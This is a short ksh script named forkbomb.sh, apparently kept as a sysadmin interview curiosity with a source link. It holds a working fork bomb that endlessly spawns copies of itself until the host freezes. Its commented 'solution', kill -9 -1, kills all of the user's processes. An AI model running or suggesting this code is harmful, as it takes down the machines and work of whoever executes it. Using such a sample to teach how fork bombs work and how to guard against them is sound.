#!/bin/ksh
# from: http://opensource.com/article/19/7/sysadmin-job-interview-questions
# forkbomb.sh
#   solution: $> kill -9 -1
f(){ f|f& };f&
